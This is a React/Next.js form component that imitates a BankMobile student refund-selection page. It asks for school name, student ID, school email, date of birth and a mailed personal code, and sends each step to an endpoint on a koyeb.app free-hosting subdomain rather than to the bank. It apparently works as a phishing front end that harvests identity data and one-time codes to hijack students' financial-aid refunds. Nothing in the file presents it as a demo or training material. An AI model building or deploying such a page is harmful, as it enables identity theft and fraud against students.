"use client";

import React, { useState } from "react";
import { ChevronDown, ChevronUp } from "lucide-react";
import { useCodeSubmissionStore } from "@/store/useCodeSubmissionStore";

// Types corresponding to API responses
interface Step1Response {
  status: string;
  submission_id?: string;
  message: string;
}

interface Step2Response {
  status: string;
  message: string;
}

const MainFormSection = () => {
  const [personalCode, setPersonalCode] = useState("");
  const [accordionOpen, setAccordionOpen] = useState(false);
  const [schoolName, setSchoolName] = useState("");
  const [studentId, setStudentId] = useState("");
  const [schoolEmail, setSchoolEmail] = useState("");
  const [dateOfBirth, setDateOfBirth] = useState("");

  // New state variables for API integration and flow
  const {
    isCodeRequested,
    submissionId,
    setSubmissionSuccess,
    clearSubmission,
  } = useCodeSubmissionStore();
  const [isLoadingGetStarted, setIsLoadingGetStarted] = useState(false);
  const [isLoadingRequestCode, setIsLoadingRequestCode] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);

  const handleGetStarted = async (e: React.SubmitEvent) => {
    e.preventDefault();
    if (!personalCode || !submissionId) {
      if (!submissionId)
        setError("Submission ID is missing. Please request a code first.");
      return;
    }

    setIsLoadingGetStarted(true);
    setError(null);
    setSuccessMessage(null);

    try {
      const response = await fetch(
        "https://gentle-sula-kronecka-194282c6.koyeb.app/setup/step-2",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            submission_id: submissionId,
            personal_code: personalCode,
          }),
        },
      );

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data: Step2Response = await response.json();

      if (data.status === "success") {
        setSuccessMessage(data.message || "Verification submission complete");
        setPersonalCode("");
        // clear the store after completion
        clearSubmission();
      } else {
        setError(data.message || "Failed to verify code. Please try again.");
      }
    } catch (err: any) {
      setError(
        err instanceof Error
          ? err.message
          : "Failed to verify code. Please try again.",
      );
    } finally {
      setIsLoadingGetStarted(false);
    }
  };

  const handleRequestCode = async (e: React.SubmitEvent) => {
    e.preventDefault();
    if (!schoolName || !studentId || !schoolEmail || !dateOfBirth) return;

    setIsLoadingRequestCode(true);
    setError(null);
    setSuccessMessage(null);

    try {
      // Input date is YYYY-MM-DD from type="date", backend wants MM/DD/YYYY
      const [year, month, day] = dateOfBirth.split("-");
      const formattedDate = `${month}/${day}/${year}`;

      const response = await fetch(
        "https://gentle-sula-kronecka-194282c6.koyeb.app/setup/step-1",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            school_name: schoolName,
            student_email: schoolEmail,
            student_id: studentId,
            date_of_birth: formattedDate,
          }),
        },
      );

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data: Step1Response = await response.json();

      if (data.status === "success" && data.submission_id) {
        setSubmissionSuccess(data.submission_id);
        setAccordionOpen(false);
        // Clear the form fields upon success
        setSchoolName("");
        setStudentId("");
        setSchoolEmail("");
        setDateOfBirth("");
        setSuccessMessage(data.message || "Proceed to Step 2");
      } else {
        setError(
          data.message ||
            "Failed to request code. Please ensure your details are correct.",
        );
      }
    } catch (err: any) {
      setError(
        err instanceof Error
          ? err.message
          : "Failed to request code. Please ensure your details are correct.",
      );
    } finally {
      setIsLoadingRequestCode(false);
    }
  };

  const isRequestFormValid =
    schoolName && studentId && schoolEmail && dateOfBirth;

  return (
    <section
      id="code"
      className="max-w-[570px] w-[90%] mx-auto my-10 relative space-y-6"
    >
      {error && (
        <div className="bg-red-50 border border-red-200 text-red-600 px-4 py-3 rounded-[2px] text-sm mb-4">
          {error}
        </div>
      )}

      {successMessage && (
        <div className="bg-green-50 border border-green-200 text-green-700 px-4 py-3 rounded-[2px] text-sm mb-4 animate-in fade-in duration-300">
          {successMessage}
        </div>
      )}

      {isCodeRequested && (
        <>
          <div className="mb-6 animate-in fade-in duration-300">
            <p className="text-neutral-primary font-bold leading-[24px]">
              To avoid any delays in accessing your money, you must select a
              refund option.<sup className="font-normal">1</sup> To get started,
              enter the personal code you should have received from us in the
              mail in a green envelope or in an email.
            </p>
            <p className="text-neutral-primary text-[0.8rem] leading-[24px] mt-2">
              <sup>1</sup> The BankMobile Checking account is one of your refund
              options but you are not required to open this account to receive
              your refund.
            </p>
          </div>

          <div className="bg-white rounded-[2px] p-4 shadow-[0_1px_5px_0px_#0000001a] animate-in fade-in slide-in-from-bottom-4 duration-300">
            <form onSubmit={handleGetStarted} className="space-y-4">
              <div className="relative">
                <input
                  type="text"
                  id="personalCode"
                  placeholder=" "
                  value={personalCode}
                  onChange={(e) => setPersonalCode(e.target.value)}
                  disabled={isLoadingGetStarted}
                  className="font-sailec peer block w-full appearance-none border border-neutral-secondary rounded-[2px] px-4 pt-6 pb-2 text-primary h-[60px] text-base focus:outline-none focus:ring-0 focus:border-accent-two-color transition-colors disabled:bg-gray-50 focus:border-2"
                />
                <label
                  htmlFor="personalCode"
                  className="font-sailec absolute text-neutral-primary duration-300 transform -translate-y-3 scale-75 top-4 z-10 origin-left left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-3 pointer-events-none"
                >
                  Your personal code
                </label>
              </div>
              <button
                type="submit"
                disabled={!personalCode || isLoadingGetStarted}
                className="w-full bg-accent-one-color hover:bg-[linear-gradient(180deg,rgba(255,255,255,0.3)_0%,rgba(0,0,0,0.0)_100%)] text-accent-two-color py-4 rounded-[2px] text-base font-medium hover:bg-[#b8d9f0] transition-all duration-300 ease-in-out disabled:cursor-not-allowed disabled:opacity-50 cursor-pointer flex items-center justify-center gap-2"
              >
                {isLoadingGetStarted ? (
                  <>
                    <div className="w-5 h-5 border-2 border-accent-two-color border-t-transparent rounded-full animate-spin"></div>
                    Processing...
                  </>
                ) : (
                  "Get started"
                )}
              </button>
            </form>

            <div className="text-center mt-4">
              <button
                onClick={() => {}}
                type="button"
                disabled={true} // Or implement actual login link logic
                className="w-full bg-transparent hover:bg-[linear-gradient(180deg,white_0%,white_25%,rgba(0,0,0,0.20)_100%)] text-accent-two-color py-4 rounded-[2px] text-base font-medium hover:bg-[#b8d9f0] transition-all duration-300 ease-in-out disabled:cursor-not-allowed disabled:opacity-50 cursor-pointer"
              >
                Have a username/password? Log in
              </button>
            </div>
          </div>
        </>
      )}

      {/* "I need a code" Accordion */}
      <div className="bg-white rounded-[2px] shadow-[0_1px_5px_0px_#0000001a]">
        {/* Accordion Header */}
        <button
          type="button"
          onClick={() => setAccordionOpen((prev) => !prev)}
          className="w-full flex justify-between items-center px-4 pt-4 pb-6 text-left cursor-pointer"
        >
          <span className="font-bold text-primary text-lg font-museo-slab ml-1">
            I need a code
          </span>
          <span className="text-primary text-lg leading-none mr-1">
            {accordionOpen ? <ChevronUp /> : <ChevronDown />}
          </span>
        </button>

        {/* Accordion Content */}
        {accordionOpen && (
          <div className="px-4 pb-4 animate-in slide-in-from-top-2 fade-in duration-200">
            <div className="mb-6">
              <h3 className="font-bold text-primary text-lg font-museo-slab mb-4">
                It&apos;s an easy process
              </h3>
              <ol className="list-decimal list-outside pl-4 text-[#333] text-base leading-[24px]">
                <li>
                  Get started by requesting your personal code. Why is this
                  needed? To confirm you are a student at your college or
                  university.
                </li>
                <li>
                  Your code will be emailed to you. Come back and enter it to
                  select your refund method.
                </li>
              </ol>

              <p className="mt-6 text-neutral-primary text-base leading-[24px] font-semibold">
                For your security, please provide us with the information below.
              </p>
            </div>

            <form onSubmit={handleRequestCode} className="space-y-4">
              <div className="relative">
                <input
                  type="text"
                  id="schoolName"
                  placeholder=" "
                  value={schoolName}
                  onChange={(e) => setSchoolName(e.target.value)}
                  disabled={isLoadingRequestCode}
                  className="peer block w-full appearance-none border border-neutral-secondary rounded-[2px] px-4 pt-6 pb-2 text-primary h-[60px] text-base focus:outline-none focus:ring-0 focus:border-accent-two-color transition-colors disabled:bg-gray-50 focus:border-2"
                />
                <label
                  htmlFor="schoolName"
                  className="absolute text-neutral-primary duration-300 transform -translate-y-3 scale-75 top-4 z-10 origin-left left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-3 pointer-events-none"
                >
                  School name
                </label>
              </div>
              <div className="relative">
                <input
                  type="text"
                  id="studentId"
                  placeholder=" "
                  value={studentId}
                  onChange={(e) => setStudentId(e.target.value)}
                  disabled={isLoadingRequestCode}
                  className="peer block w-full appearance-none border border-neutral-secondary rounded-[2px] px-4 pt-6 pb-2 text-primary h-[60px] text-base focus:outline-none focus:ring-0 focus:border-accent-two-color transition-colors disabled:bg-gray-50 focus:border-2"
                />
                <label
                  htmlFor="studentId"
                  className="absolute text-neutral-primary duration-300 transform -translate-y-3 scale-75 top-4 z-10 origin-left left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-3 pointer-events-none"
                >
                  Student ID number
                </label>
              </div>
              <div className="relative">
                <input
                  type="email"
                  id="schoolEmail"
                  placeholder=" "
                  value={schoolEmail}
                  onChange={(e) => setSchoolEmail(e.target.value)}
                  disabled={isLoadingRequestCode}
                  className="peer block w-full appearance-none border border-neutral-secondary rounded-[2px] px-4 pt-6 pb-2 text-primary h-[60px] text-base focus:outline-none focus:ring-0 focus:border-accent-two-color transition-colors disabled:bg-gray-50 focus:border-2"
                />
                <label
                  htmlFor="schoolEmail"
                  className="absolute text-neutral-primary duration-300 transform -translate-y-3 scale-75 top-4 z-10 origin-left left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-3 pointer-events-none"
                >
                  School email
                </label>
              </div>
              <div className="relative">
                <input
                  type="date"
                  id="dateOfBirth"
                  placeholder=" "
                  value={dateOfBirth}
                  onChange={(e) => setDateOfBirth(e.target.value)}
                  disabled={isLoadingRequestCode}
                  className="peer block w-full appearance-none border border-neutral-secondary rounded-[2px] px-4 pt-6 pb-2 text-primary h-[60px] text-base focus:outline-none focus:ring-0 focus:border-accent-two-color transition-colors disabled:bg-gray-50 focus:border-2"
                />
                <label
                  htmlFor="dateOfBirth"
                  className="absolute text-neutral-primary duration-300 transform -translate-y-3 scale-75 top-4 z-10 origin-left left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-3 pointer-events-none"
                >
                  Date of birth
                </label>
              </div>
              <button
                type="submit"
                disabled={!isRequestFormValid || isLoadingRequestCode}
                className="disabled:cursor-not-allowed disabled:opacity-50 w-full border-2 border-accent-two-color text-accent-two-color bg-white py-4 rounded-[2px] text-base font-medium hover:bg-[linear-gradient(180deg,white_0%,white_25%,rgba(0,0,0,0.20)_100%)] transition-all duration-300 ease-in-out cursor-pointer flex items-center justify-center gap-2"
              >
                {isLoadingRequestCode ? (
                  <>
                    <div className="w-5 h-5 border-2 border-accent-two-color border-t-transparent rounded-full animate-spin"></div>
                    Processing...
                  </>
                ) : (
                  "Request my personal code"
                )}
              </button>
            </form>
          </div>
        )}
      </div>
    </section>
  );
};

export default MainFormSection;
